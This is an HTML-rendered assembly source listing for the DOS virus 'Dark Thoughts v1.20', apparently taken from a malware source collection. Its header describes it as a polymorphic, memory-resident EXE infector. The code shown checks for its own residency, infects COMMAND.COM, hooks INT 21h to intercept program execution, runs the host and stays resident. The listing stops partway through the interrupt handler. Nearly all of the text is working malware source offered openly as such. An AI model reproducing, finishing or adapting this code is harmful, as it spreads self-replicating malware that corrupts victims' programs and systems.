<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.DarkThoughts.6144 - DT12.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Virus Name: DARK THOUGHTS v1.20</span><span class="sc0">
</span><span class="sc1">;Origin    : Europe/Greece</span><span class="sc0">
</span><span class="sc1">;Author    : ANAKTAS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;GENERAL INFO:</span><span class="sc0">
</span><span class="sc1">;   -Size: Increase files by 6144 bytes.    </span><span class="sc0">
</span><span class="sc1">;   -TSR EXE infector </span><span class="sc0">
</span><span class="sc1">;   -Polymorphic by using ENTHELECHIA v1.0 (Source in enthel.SPL)</span><span class="sc0">
</span><span class="sc1">;   -UMB Resident</span><span class="sc0">
</span><span class="sc1">;   -Seeks Original Int 21h by using signatures </span><span class="sc0">
</span><span class="sc1">;    instead of tunneling.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus is actually vanitas II with some changes. </span><span class="sc0">
</span><span class="sc1">; I wrote it to demostrate my poly engine ENTHELECHIA V1.0.</span><span class="sc0">
</span><span class="sc1">;_______________________________________________________</span><span class="sc0">


</span><span class="sc5">APPLYSIZE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">6144</span><span class="sc0">
</span><span class="sc5">BUFFERSIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16384</span><span class="sc0">
</span><span class="sc5">ALOCSIZE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">22528</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">VIRUS_V</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-------------------------place-decryptor-Here------------------------</span><span class="sc0">
</span><span class="sc1">;Decryptor Will destroy DS or ES(makes it ecual to CS) </span><span class="sc0">
</span><span class="sc1">;_________________________________________________________________</span><span class="sc0">

</span><span class="sc5">startofvirusbody</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc1">;get delta offset in BP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    

</span><span class="sc1">;save PSP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">SavePSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">savePSP</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">datasegm</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">; am i in memory ?       </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3700h</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0"> 
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">       
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0"> 
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_in_mem</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">giveCPU</span><span class="sc0">
    </span><span class="sc5">not_in_mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;scans for original INT21h. </span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">scan21</span><span class="sc0">


</span><span class="sc1">;check if we are in protected mode (Windows,Win95,OS/2)</span><span class="sc0">
</span><span class="sc1">;if yes, don't try to stay in memory but infect some files...</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1687h</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
     </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_DPMI</span><span class="sc0">  

</span><span class="sc1">;allocate memory for buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ALOCSIZE</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alloc_mem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">;infect Command.com </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_command</span><span class="sc0">  

</span><span class="sc1">;release buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">giveCPU</span><span class="sc0">     
</span><span class="sc5">no_DPMI</span><span class="sc4">:</span><span class="sc0">        

</span><span class="sc1">;allocate memory for buffer and for code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ALOCSIZE</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alloc_UMB</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">stay_in_conv</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">;infect Command.com </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_command</span><span class="sc0">          
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ALOCSIZE</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">alloc_UMB</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">stay_in_conv</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Yes_UMB</span><span class="sc0">
    
</span><span class="sc1">;No UMB - use_oldtrick</span><span class="sc0">
</span><span class="sc1">;----------------------------------------</span><span class="sc0">
</span><span class="sc5">stay_in_conv</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;Move code next to PSP. </span><span class="sc0">
</span><span class="sc1">;only a small part to avoid overwritting</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">datasegm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">firstpart</span><span class="sc0"> 
    </span><span class="sc6">cld</span><span class="sc0">                
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0"> 

</span><span class="sc1">; Pass the mic to the TSR  copy of virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Warp</span><span class="sc0">        
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          
    </span><span class="sc6">retf</span><span class="sc0">             
    </span><span class="sc5">Warp</span><span class="sc4">:</span><span class="sc0">   

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0"> </span><span class="sc1">;Delta offset is zero now. </span><span class="sc0">

</span><span class="sc1">;now copy the rest!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">firstpart</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">firstpart</span><span class="sc0"> </span><span class="sc1">;clean-up prefetch queue</span><span class="sc0">
    </span><span class="sc5">firstpart</span><span class="sc4">:</span><span class="sc0">
    
</span><span class="sc1">;resize host </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">datasegm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ALOCSIZE</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
</span><span class="sc1">;new buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">datasegm</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;PSP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">       </span><span class="sc1">;+PSP=viruscode</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0">   </span><span class="sc1">;+virussize= end of viruscode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;buffer </span><span class="sc0">
    
</span><span class="sc1">;infect Command.com </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_command</span><span class="sc0">          

</span><span class="sc1">;Redirect Interrupt 21h to new21  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">         
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">               
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new21</span><span class="sc0">  
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">              

</span><span class="sc1">; Create parametre block</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">envir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">datasegm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">line</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCB1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCB2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">line</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5Ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCB1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6Ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCB2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">datasegm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">envir</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;  ds=enviroment</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;ds=enviroment            </span><span class="sc0">
    

</span><span class="sc1">; Locate filename.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">  
    </span><span class="sc5">xixi</span><span class="sc4">:</span><span class="sc0">          
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">         
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">    
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">xixi</span><span class="sc0">        
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">      

</span><span class="sc1">; Move stack to the end of allocated memory.</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc1">; Execution of the host (EXEC)</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">    </span><span class="sc1">; Recall stack area. Exec might destroy SS and SP. </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc1">; Get exit-code of the host</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc0">  
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">      </span><span class="sc1">; By returning the same return-code.</span><span class="sc0">

</span><span class="sc1">;Return to dos by returning the same exit-code(errorlevel). </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ALOCSIZE</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0">  </span><span class="sc1">;keep bytes in memory   </span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">      
</span><span class="sc1">;--------------------------------------</span><span class="sc0">

</span><span class="sc5">Yes_UMB</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;copy virus code to the reserved memory </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> 
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">       
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                    

</span><span class="sc1">;Redirect Interrupt 21h to new21  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">         
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">               
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">new21</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">              </span><span class="sc1">; now!</span><span class="sc0">

</span><span class="sc5">giveCPU</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;calculate original entry-point and PUSH it... </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;GET DS/ES</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">datasegm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">; AX=BX=CX=DX=SI=DI=BP=0000</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> 
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc1">;jmp to the original entry-point</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">








</span><span class="sc1">;________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;The new Interrupt 21h handler!</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc5">new21</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">

</span><span class="sc1">;verifies that virus has already hook int21h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3700h</span><span class="sc0">     </span><span class="sc1">; asking for command line switch chracter...</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_verify</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0">    </span><span class="sc1">; or for me?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_verify</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">adr21</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; Yes, i am here!</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">           
    </span><span class="sc5">not_verify</span><span class="sc4">:</span><span class="sc0">    


    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; push them...</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0"> </span><span class="sc1">;Execute  file?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">filefuc</span><span class="sc0">  
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0"> 

         
</span><span class="sc1">;   xor ah,3Dh ; open file?    </span><span class="sc0">
</span><span class="sc1">;   jz filefuc   </span><span class="sc0">
</span><span class="sc1">;   xor ah,3Dh </span><span class="sc0">
    
         
</span><span class="sc1">;   xor ah,56h ; rename file?</span><span class="sc0">
</span><span class="sc1">;   jz filefuc</span><span class="sc0">
